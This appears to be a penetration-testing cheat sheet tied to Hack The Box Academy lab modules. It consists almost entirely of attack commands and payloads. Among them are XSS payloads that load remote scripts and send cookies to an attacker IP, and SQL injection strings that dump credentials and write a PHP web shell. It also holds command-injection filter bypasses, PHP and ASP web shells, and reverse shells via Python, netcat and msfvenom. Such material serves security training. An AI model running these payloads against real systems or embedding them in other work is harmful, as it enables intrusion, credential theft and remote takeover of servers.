## cURL

| Command | Description |
| ------- | ----------- |
| `curl -h` | cURL help menu |
| `curl inlanefreight.com` | Basic GET request |
| `curl -s -O inlanefreight.com/index.html` | Download file |
| `curl -k https://inlanefreight.com` | Skip HTTPS (SSL) certificate validation |
| `curl inlanefreight.com -v` | Print full HTTP request/response details |
| `curl -I https://www.inlanefreight.com` | Send HEAD request (only prints response headers) |
| `curl -i https://www.inlanefreight.com` | Print response headers and response body |
| `curl https://www.inlanefreight.com -A 'Mozilla/5.0'` | Set User-Agent header |
| `curl -u admin:admin http://<SERVER_IP>:<PORT>/` | Set HTTP basic authorization credentials |
| `curl http://admin:admin@<SERVER_IP>:<PORT>/` | Pass HTTP basic authorization credentials in the URL |
| `curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/` | Set request header |
| `curl 'http://<SERVER_IP>:<PORT>/search.php?search=le'` | Pass GET parameters |
| `curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/` | Send POST request with POST data |
| `curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/` | Set request cookies |
| `curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php` | Send POST request with JSON data |

## APIs

| Command | Description |
| ------- | ----------- |
| `curl http://<SERVER_IP>:<PORT>/api.php/city/london` | Read entry |
| `curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq` | Read all entries |
| `curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` | Create (add) entry |
| `curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` | Update (modify) entry |
| `curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City` | Delete entry |

# WHOIS

| Command                  | Description                       |
|--------------------------|-----------------------------------|
| `export TARGET="domain.tld"` | Assign target to an environment variable. |
| `whois $TARGET`          | WHOIS lookup for the target.      |

# DNS Enumeration

| Command                            | Description                                          |
|------------------------------------|------------------------------------------------------|
| `nslookup $TARGET`                 | Identify the A record for the target domain.         |
| `nslookup -query=A $TARGET`        | Identify the A record for the target domain.         |
| `dig $TARGET @<nameserver/IP>`     | Identify the A record for the target domain.         |
| `dig a $TARGET @<nameserver/IP>`   | Identify the A record for the target domain.         |
| `nslookup -query=PTR <IP>`         | Identify the PTR record for the target IP address.   |
| `dig -x <IP> @<nameserver/IP>`     | Identify the PTR record for the target IP address.   |
| `nslookup -query=ANY $TARGET`      | Identify ANY records for the target domain.          |
| `dig any $TARGET @<nameserver/IP>` | Identify ANY records for the target domain.          |
| `nslookup -query=TXT $TARGET`      | Identify the TXT records for the target domain.      |
| `dig txt $TARGET @<nameserver/IP>` | Identify the TXT records for the target domain.      |
| `nslookup -query=MX $TARGET`       | Identify the MX records for the target domain.       |
| `dig mx $TARGET @<nameserver/IP>`  | Identify the MX records for the target domain.       |

# Passive Subdomain Enumeration

| Resource/Command                                                                                | Description                                |
|-------------------------------------------------------------------------------------------------|--------------------------------------------|
| [VirusTotal](https://www.virustotal.com/gui/home/url)                                           |                                            |
| [Censys](https://censys.io/)                                                                    |                                            |
| [Crt.sh](https://crt.sh/)                                                                       |                                            |
| `curl -s https://sonar.omnisint.io/subdomains/{domain} \| jq -r '.[]' \| sort -u`               | All subdomains for a given domain.         |
| `curl -s https://sonar.omnisint.io/tlds/{domain} \| jq -r '.[]' \| sort -u`                     | All TLDs found for a given domain.         |
| `curl -s https://sonar.omnisint.io/all/{domain} \| jq -r '.[]' \| sort -u`                      | All results across all TLDs for a given domain. |
| `curl -s https://sonar.omnisint.io/reverse/{ip} \| jq -r '.[]' \| sort -u`                      | Reverse DNS lookup on IP address.          |
| `curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} \| jq -r '.[]' \| sort -u`               | Reverse DNS lookup of a CIDR range.        |
| `curl -s "https://crt.sh/?q=${TARGET}&output=json" \| jq -r '.[] \| "\(.name_value)\n\(.common_name)"' \| sort -u` | Certificate Transparency.    |

# Passive Infrastructure Identification

| Resource/Command                                                       | Description                                                   |
|------------------------------------------------------------------------|---------------------------------------------------------------|
| Netcraft                                                               |                                                               |
| WayBackMachine                                                         |                                                               |
| WayBackURLs                                                            |                                                               |
| `waybackurls -dates https://$TARGET > waybackurls.txt`                 | Crawling URLs from a domain with the date it was obtained.    |

# Active Infrastructure Identification

| Resource/Command                                                       | Description                                                   |
|------------------------------------------------------------------------|---------------------------------------------------------------|
| `curl -I "http://${TARGET}"`                                           | Display HTTP headers of the target webserver.                 |
| `whatweb -a https://www.facebook.com -v`                               | Technology identification.                                    |
| Wappalyzer                                                             |                                                               |
| `wafw00f -v https://$TARGET`                                           | WAF Fingerprinting.                                           |
| Aquatone                                                               |                                                               |
| `cat subdomain.list \| aquatone -out ./aquatone -screenshot-timeout 1000` | Makes screenshots of all subdomains in the subdomain.list.    |

# Active Subdomain Enumeration

| Resource/Command                                                                               | Description                                                        |
|------------------------------------------------------------------------------------------------|--------------------------------------------------------------------|
| HackerTarget                                                                                   |                                                                    |
| SecLists                                                                                       |                                                                    |
| `nslookup -type=any -query=AXFR $TARGET nameserver.target.domain`                              | Zone Transfer using Nslookup against the target domain and its nameserver. |
| `gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"` | Bruteforcing subdomains.                                           |

# Virtual Hosts

| Resource/Command                                                                                           | Description                                                |
|------------------------------------------------------------------------------------------------------------|------------------------------------------------------------|
| `curl -s http://192.168.10.10 -H "Host: randomtarget.com"`                                                 | Changing the HOST HTTP header to request a specific domain. |
| `cat ./vhosts.list \| while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://<IP address> -H "HOST: ${vhost}.target.domain" \| grep "Content-Length: ";done` | Bruteforcing for possible virtual hosts on the target domain. |
| `ffuf -w ./vhosts -u http://<IP address> -H "HOST: FUZZ.target.domain" -fs 612`                            | Bruteforcing for possible virtual hosts on the target domain using ffuf. |

# Crawling

| Resource/Command                                                                                     | Description                                                                                |
|------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------|
| ZAP                                                                                                  |                                                                                            |
| `ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt` | Discovering files and folders that cannot be spotted by browsing the website.              |
| `ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://www.target.domain/FOLDERS/WORDLISTEXTENSIONS`         |

# Ffuf

| Command                                                                                                                            | Description                    |
|------------------------------------------------------------------------------------------------------------------------------------|--------------------------------|
| `ffuf -h`                                                                                                                          | ffuf help                      |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ`                                                                          | Directory Fuzzing              |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ`                                                                     | Extension Fuzzing              |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php`                                                                 | Page Fuzzing                   |
| `ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v`                                 | Recursive Fuzzing              |
| `ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/`                                                                         | Sub-domain Fuzzing             |
| `ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx`                                        | VHost Fuzzing                  |
| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx`                                      | Parameter Fuzzing - GET        |
| `ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` | Parameter Fuzzing - POST       |
| `ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`       | Value Fuzzing                  |

## Wordlists

| Command                                                                                                    | Description              |
|------------------------------------------------------------------------------------------------------------|--------------------------|
| `/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt`                                  | Directory/Page Wordlist  |
| `/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt`                                            | Extensions Wordlist      |
| `/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`                                       | Domain Wordlist          |
| `/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt`                                      | Parameters Wordlist      |

## Misc

| Command                                                                                                            | Description              |
|--------------------------------------------------------------------------------------------------------------------|--------------------------|
| `sudo sh -c 'echo "SERVER_IP academy.htb" >> /etc/hosts'`                                                          | Add DNS entry            |
| `for i in $(seq 1 1000); do echo $i >> ids.txt; done`                                                              | Create Sequence Wordlist |
| `curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'` | curl w/ POST  |

# Javascript Deobfuscation

| Command                                                                       | Description                      |
|-------------------------------------------------------------------------------|----------------------------------|
| `curl http://SERVER_IP:PORT/`                                                 | cURL GET request                 |
| `curl -s http://SERVER_IP:PORT/ -X POST`                                      | cURL POST request                |
| `curl -s http://SERVER_IP:PORT/ -X POST -d "param1=sample"`                   | cURL POST request with data      |
| `echo hackthebox \| base64`                                                   | base64 encode                    |
| `echo ENCODED_B64 \| base64 -d`                                               | base64 decode                    |
| `echo hackthebox \| xxd -p`                                                   | hex encode                       |
| `echo ENCODED_HEX \| xxd -p -r`                                               | hex decode                       |
| `echo hackthebox \| tr 'A-Za-z' 'N-ZA-Mn-za-m'`                               | rot13 encode                     |
| `echo ENCODED_ROT13 \| tr 'A-Za-z' 'N-ZA-Mn-za-m'`                            | rot13 decode                     |

# Deobfuscation Websites

| Website       | Link                            |
|---------------|---------------------------------|
| JS Console    | https://jsconsole.com/          | 
| Prettier      | https://prettier.io/playground/ | 
| Beautifier    | https://beautifier.io/          |
| JSNice        | http://www.jsnice.org/          |

# Misc

| Command       | Description                        |
|---------------|------------------------------------|
| `ctrl+u`      | Show HTML source code in Firefox   |

# XSS Payloads

| Payload                                                                                     | Description                          |
|---------------------------------------------------------------------------------------------|--------------------------------------|
| `<script>alert(window.origin)</script>`                                                     | Basic XSS Payload                    |
| `<plaintext>`                                                                               | Basic XSS Payload                    |
| `<script>print()</script>`                                                                  | Basic XSS Payload                    |
| `<img src="" onerror=alert(window.origin)>`                                                 | HTML-based XSS Payload               |
| `<script>document.body.style.background = "#141d2b"</script>`                               | Change Background Color              |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image              |
| `<script>document.title = 'HackTheBox Academy'</script>`                                    | Change Website Title                 |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>`              | Overwrite website's main body        |
| `<script>document.getElementById('urlform').remove();</script>`                             | Remove certain HTML element          |
| `<script src="http://OUR_IP/script.js"></script>`                                           | Load remote script                   |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>`             | Send Cookie details to us            |

## Commands

| Command                                                                               | Description                    |
|---------------------------------------------------------------------------------------|--------------------------------|
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`                   | Run xsstrike on a URL parameter|
| `sudo nc -lvnp 80`                                                                    | Start netcat listener          |
| `sudo php -S 0.0.0.0:80`                                                              | Start PHP server               |

# MySQL

## Command	Description

### General

| Command                                                                 | Description              |
|-------------------------------------------------------------------------|--------------------------|
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p`                      | login to mysql database  |
| `SHOW DATABASES`                                                        | List available databases |
| `USE users`                                                             | Switch to database       |

### Tables

| Command                                                                 | Description                 |
|-------------------------------------------------------------------------|-----------------------------|
| `CREATE TABLE logins (id INT, ...)`                                     | Add a new table             |
| `SHOW TABLES`                                                           | List available tables in current database |
| `DESCRIBE logins`                                                       | Show table properties and columns |
| `INSERT INTO table_name VALUES (value_1,..)`                            | Add values to table         |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)`       | Add values to specific columns in a table |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>`        | Update table values         |

### Columns

| Command                                                                 | Description                 |
|-------------------------------------------------------------------------|-----------------------------|
| `SELECT * FROM table_name`                                              | Show all columns in a table |
| `SELECT column1, column2 FROM table_name`                               | Show specific columns in a table |
| `DROP TABLE logins`                                                     | Delete a table              |
| `ALTER TABLE logins ADD newColumn INT`                                  | Add new column              |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn`               | Rename column               |
| `ALTER TABLE logins MODIFY oldColumn DATE`                              | Change column datatype      |
| `ALTER TABLE logins DROP oldColumn`                                     | Delete column               |

### Output

| Command                                                                 | Description                 |
|-------------------------------------------------------------------------|-----------------------------|
| `SELECT * FROM logins ORDER BY column_1`                                | Sort by column              |
| `SELECT * FROM logins ORDER BY column_1 DESC`                           | Sort by column in descending order |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC`                   | Sort by two-columns         |
| `SELECT * FROM logins LIMIT 2`                                          | Only show first two results |
| `SELECT * FROM logins LIMIT 1, 2`                                       | Only show first two results starting from index 2 |
| `SELECT * FROM table_name WHERE <condition>`                            | List results that meet a condition |
| `SELECT * FROM logins WHERE username LIKE 'admin%'`                     | List results where the name is similar to a given string |

## MySQL Operator Precedence

1. Division (/), Multiplication (*), and Modulus (%)
2. Addition (+) and Subtraction (-)
3. Comparison (=, >, <, <=, >=, !=, LIKE)
4. NOT (!)
5. AND (&&)
6. OR (||)

## SQL Injection

### Payload	Description

#### Auth Bypass

| Payload                                                                 | Description                 |
|-------------------------------------------------------------------------|-----------------------------|
| `admin' or '1'='1`                                                      | Basic Auth Bypass           |
| `admin')-- -`                                                           | Basic Auth Bypass With comments |

#### Auth Bypass Payloads

#### Union Injection

| Payload                                                                 | Description                 |
|-------------------------------------------------------------------------|-----------------------------|
| `' order by 1-- -`                                                      | Detect number of columns using order by |
| `cn' UNION select 1,2,3-- -`                                            | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -`                                  | Basic Union injection       |
| `UNION select username, 2, 3, 4 from passwords-- -`                     | Union injection for 4 columns |

#### DB Enumeration

| Payload                                                                 | Description                 |
|-------------------------------------------------------------------------|-----------------------------|
| `SELECT @@version`                                                      | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)`                                                       | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -`                                 | Current database name       |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases          |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -`    | Dump data from a table in another database |

#### Privileges

| Payload                                                                 | Description                 |
|-------------------------------------------------------------------------|-----------------------------|
| `cn' UNION SELECT 1, user(), 3, 4-- -`                                  | Find current user           |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Find all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |

#### File Injection

| Payload                                                                 | Description                 |
|-------------------------------------------------------------------------|-----------------------------|
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`                | Read local file             |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |

# SQLMap Commands

| Command                                                                 | Description                                           |
|-------------------------------------------------------------------------|-------------------------------------------------------|
| `sqlmap -h`                                                             | View the basic help menu                              |
| `sqlmap -hh`                                                            | View the advanced help menu                           |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`              | Run SQLMap without asking for user input              |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`             | SQLMap with POST request                              |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`            | POST request specifying an injection point with an asterisk |
| `sqlmap -r req.txt`                                                     | Passing an HTTP request file to SQLMap                |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`      | Specifying a cookie header                            |
| `sqlmap -u www.target.com --data='id=1' --method PUT`                   | Specifying a PUT request                              |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` | Store traffic to an output file                       |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`          | Specify verbosity level                               |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`   | Specifying a prefix or suffix                         |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`                        | Specifying the level and risk                         |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` | Basic DB enumeration                                  |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb`           | Table enumeration                                     |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname` | Table/row enumeration                                 |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | Conditional enumeration                               |
| `sqlmap -u "http://www.example.com/?id=1" --schema`                     | Database schema enumeration                           |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`             | Searching for data                                    |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch`          | Password enumeration and cracking                     |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | Anti-CSRF token bypass                                |
| `sqlmap --list-tampers`                                                 | List all tamper scripts                               |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`            | Check for DBA privileges                              |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`    | Reading a local file                                  |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Writing a file                                        |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`                   | Spawning an OS shell                                  |

# Command Injection 

## Injection Operator

| Injection Operator | Injection Character | URL-Encoded Character | Executed Command                        |
|--------------------|---------------------|-----------------------|-----------------------------------------|
| Semicolon          | ;                   | %3b                   | Both                                    |
| New Line           | \n                  | %0a                   | Both                                    |
| Background         | &                   | %26                   | Both (second output generally shown first) |
| Pipe               | \|                  | %7c                   | Both (only second output is shown)      |
| AND                | &&                  | %26%26                | Both (only if first succeeds)           |
| OR                 | \|\|                | %7c%7c                | Second (only if first fails)            |
| Sub-Shell          | ``                  | %60%60                | Both (Linux-only)                       |
| Sub-Shell          | $()                 | %24%28%29             | Both (Linux-only)                       |

# Linux

## Filtered Character Bypass

| Code                     | Description                                        |
|--------------------------|----------------------------------------------------|
| `printenv`               | Can be used to view all environment variables      |

### Spaces

| Code                     | Description                                        |
|--------------------------|----------------------------------------------------|
| `%09`                    | Using tabs instead of spaces                       |
| `${IFS}`                 | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $()) |
| `{ls,-la}`               | Commas will be replaced with spaces                |

### Other Characters

| Code                     | Description                                        |
|--------------------------|----------------------------------------------------|
| `${PATH:0:1}`            | Will be replaced with /                            |
| `${LS_COLORS:10:1}`      | Will be replaced with ;                            |
| `$(tr '!-}' '"-~'<<<[)`  | Shift character by one ([ -> \)                    |

## Blacklisted Command Bypass

### Character Insertion

| Code                     | Description                                        |
|--------------------------|----------------------------------------------------|
| `' or "`                 | Total must be even                                 |
| `$@ or \`                | Linux only                                         |

### Case Manipulation

| Code                                              | Description                                        |
|---------------------------------------------------|----------------------------------------------------|
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`                | Execute command regardless of cases                |
| `$(a="WhOaMi";printf %s "${a,,}")`                | Another variation of the technique                 |

### Reversed Commands

| Code                     | Description                                        |
|--------------------------|----------------------------------------------------|
| `echo 'whoami' | rev`    | Reverse a string                                   |
| `$(rev<<<'imaohw')`      | Execute reversed command                           |

### Encoded Commands

| Code                                                              | Description                                        |
|-------------------------------------------------------------------|----------------------------------------------------|
| `echo -n 'cat /etc/passwd | grep 33' | base64`                    | Encode a string with base64                        |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`      | Execute b64 encoded string                         |

# Windows

## Filtered Character Bypass

| Code                     | Description                                        |
|--------------------------|----------------------------------------------------|
| `Get-ChildItem Env:`     | Can be used to view all environment variables - (PowerShell) |

### Spaces

| Code                                     | Description                                        |
|------------------------------------------|----------------------------------------------------|
| `%09`                                    | Using tabs instead of spaces                       |
| `%PROGRAMFILES:~10,-5%`                  | Will be replaced with a space - (CMD)              |
| `$env:PROGRAMFILES[10]`                  | Will be replaced with a space - (PowerShell)       |

### Other Characters

| Code                                     | Description                                        |
|------------------------------------------|----------------------------------------------------|
| `%HOMEPATH:~0,-17%`                      | Will be replaced with \ - (CMD)                    |
| `$env:HOMEPATH[0]`                       | Will be replaced with \ - (PowerShell)             |

## Blacklisted Command Bypass

### Character Insertion

| Code                     | Description                                        |
|--------------------------|----------------------------------------------------|
| `' or "`                 | Total must be even                                 |
| `^`                      | Windows only (CMD)                                 |

### Case Manipulation

| Code                     | Description                                        |
|--------------------------|----------------------------------------------------|
| `WhoAmi`                 | Simply send the character with odd cases           |

### Reversed Commands

| Code                                             | Description                                        |
|--------------------------------------------------|----------------------------------------------------|
| `"whoami"[-1..-20] -join ''`                     | Reverse a string                                   |
| `iex "$('imaohw'[-1..-20] -join '')"`            | Execute reversed command                           |

### Encoded Commands

| Code                                                                                            | Description                                        |
|-------------------------------------------------------------------------------------------------|----------------------------------------------------|
| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`                  | Encode a string with base64                        |
| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute b64 encoded string                         |

# File Upload

## Web Shell

| Web Shell                                         | Description                   |
|---------------------------------------------------|-------------------------------|
| `<?php file_get_contents('/etc/passwd'); ?>`      | Basic PHP File Read           |
| `<?php system('hostname'); ?>`                    | Basic PHP Command Execution   |
| `<?php system($_REQUEST['cmd']); ?>`              | Basic PHP Web Shell           |
| `<% eval request('cmd') %>`                       | Basic ASP Web Shell           |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` | Generate PHP reverse shell     |
| PHP Web Shell                                     | PHP Web Shell                 |
| PHP Reverse Shell                                 | PHP Reverse Shell             |
| Web/Reverse Shells                                | List of Web Shells and Reverse Shells |

## Bypasses

### Command	Description

#### Client-Side Bypass

| Command                | Description           |
|------------------------|-----------------------|
| `[CTRL+SHIFT+C]`       | Toggle Page Inspector |

#### Blacklist Bypass

| Command                | Description           |
|------------------------|-----------------------|
| `shell.phtml`          | Uncommon Extension    |
| `shell.pHp`            | Case Manipulation     |
| PHP Extensions         | List of PHP Extensions|
| ASP Extensions         | List of ASP Extensions|
| Web Extensions         | List of Web Extensions|

#### Whitelist Bypass

| Command                | Description           |
|------------------------|-----------------------|
| `shell.jpg.php`        | Double Extension      |
| `shell.php.jpg`        | Reverse Double Extension |
| `%20, %0a, %00, %0d0a, /, .\, ., …` | Character Injection - Before/After Extension |

#### Content/Type Bypass

| Command                | Description           |
|------------------------|-----------------------|
| Web Content-Types      | List of Web Content-Types|
| Content-Types          | List of All Content-Types |
| File Signatures        | List of File Signatures/Magic Bytes|

## Limited Uploads

| Potential Attack       | File Types            |
|------------------------|-----------------------|
| XSS                    | HTML, JS, SVG, GIF    |
| XXE/SSRF               | XML, SVG, PDF, PPT, DOC|
| DoS                    | ZIP, JPG, PNG         |

# Nginx Reverse Proxy & AJP

## Command	Description

| Command                                                                                                        | Description                                                                 |
|----------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------|
| `wget https://nginx.org/download/nginx-1.21.3.tar.gz`                                                          | Downloading nginx                                                           |
| `tar -xzvf nginx-1.21.3.tar.gz`                                                                                | Extracting nginx tar file                                                   |
| `git clone https://github.com/dvershinin/nginx_ajp_module.git`                                                 | Cloning nginx_ajp source code                                               |
| `cd nginx-1.21.3`                                                                                              | Navigating to nginx directory                                               |
| `./configure --add-module=$(pwd)/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules` | Setting up the configuration for building and installing Nginx web server |
| `make`                                                                                                         | GNU make utility to maintain groups of programs                             |
| `sudo make install`                                                                                            | Instructing the make command to execute the installation target defined in the make file |
| `sudo nginx`                                                                                                   | Starting the nginx server                                                   |

# SSRF Exploitation Example

## Command	Description

| Command                                                                                         | Description                                                                  |
|-------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------|
| `nmap -sT -T5 --min-rate=10000 -p- 10.129.201.238`                                              | Scanning the ports of the external target                                    |
| `curl -i -s -L http://<TARGET IP>`                                                              | Interacting with the target and following redirects                          |
| `nc -lvnp 8080`                                                                                 | Starting a netcat listener to test for SSRF                                  |
| `curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:8080"`                       | Testing for SSRF vulnerability                                               |
| `python3 -m http.server 9090`                                                                   | Starting the python web server                                               |
| `sudo pip3 install twisted`                                                                     | Installing the ftp server                                                    |
| `sudo python3 -m twisted ftp -p 21 -r .`                                                        | Starting the ftp server                                                      |
| `curl -i -s "http://<TARGET IP>/load?q=http://<VPN/TUN Adapter IP>:9090/index.html"`            | Retrieving a remote file through the target application (HTTP Schema)        |
| `curl -i -s "http://<TARGET IP>/load?q=file:///etc/passwd"`                                     | Retrieving a local file through the target application (File Schema)         |
| `for port in {1..65535};do echo $port >> ports.txt;done`                                        | Generating a wordlist of possible ports                                      |
| `ffuf -w ./ports.txt:PORT -u "http://<TARGET IP>/load?q=http://127.0.0.1:PORT" -fs 30`          | Fuzzing for ports on the internal interface                                  |
| `curl -i -s "http://<TARGET IP>/load?q=http://127.0.0.1:5000"`                                  | Interacting with the internal interface on the discovered port               |
| `curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=index.html"`            | Interacting with the internal application                                    |
| `curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"`    | Discovering web application listening in on localhost                        |
| `curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"` | Modifying the URL to bypass the error message                                |
| `curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -` | Requesting to disclose the /proc/self/environ file on the internal application |
| `curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"` | Retrieving a local file through the target application                       |
| `curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"` | Confirming remote code execution on the remote host                          |
| `sudo apt-get install jq`                                                                      | Installing jq                                                                |

# Blind SSRF Exploitation Example

## Command	Description

| Command                                                                                                     | Description                                                                  |
|-------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------|
| `nc -lvnp 9090`                                                                                             | Starting a netcat listener                                                   |
| `echo """<B64 encoded response>""" | base64 -d`                                                             | Decoding the base64 encoded response                                         |
| `export RHOST="<VPN/TUN IP>";export RPORT="<PORT>";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'` | Reverse shell payload (to be URL encoded twice) |

# SSI Injection Exploitation Example

## SSI Directive Payload	Description

| SSI Directive Payload                                                              | Description     |
|------------------------------------------------------------------------------------|-----------------|
| `<!--#echo var="DATE_LOCAL" -->`                                                    | Date            |
| `<!--#printenv -->`                                                                 | All variables   |
| `<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->` | Reverse Shell   |

# SSTI Exploitation Example 1

## Command	Description

| Command                                                               | Description                                                             |
|-----------------------------------------------------------------------|-------------------------------------------------------------------------|
| `git clone https://github.com/epinna/tplmap.git`                      | Cloning the tplmap repository                                           |
| `cd tplmap`                                                           | Navigating to the new directory                                         |
| `pip install virtualenv`                                              | Installing the virtual environment with pip                             |
| `virtualenv -p python2 venv`                                          | Creating a virtual environment named venv with python2                  |
| `source venv/bin/activate`                                            | Activating a Python virtual environment, configuring the shell to use the virtual environment's Python interpreter |
| `pip install -r requirements.txt`                                     | Installing dependencies                                                 |
| `./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john`             | Running tplmap against the target                                       |
| `./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john --os-shell`  | Running tplmap with the os-shell option                                 |
